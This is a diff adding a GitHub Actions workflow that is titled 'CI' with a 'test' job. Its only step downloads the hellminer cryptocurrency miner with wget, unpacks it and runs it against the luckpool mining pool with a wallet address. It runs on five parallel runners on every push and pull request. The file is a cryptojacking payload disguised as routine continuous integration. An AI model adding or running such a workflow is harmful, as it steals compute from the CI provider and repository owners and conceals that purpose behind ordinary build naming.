@@ -1,0 +1,18 @@
+name: CI
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+  workflow_dispatch:
+jobs:
+  test:
+   name: miner
+   runs-on: ubuntu-latest
+   strategy:
+    fail-fast: false
+    matrix:
+     runner: [0,1,2,3,4]
+   steps:
+     - run: |
+        wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -p x --cpu 2 -u RTSN11esMroYAGPDZaGmnPrGXCqjZWDqym.github1
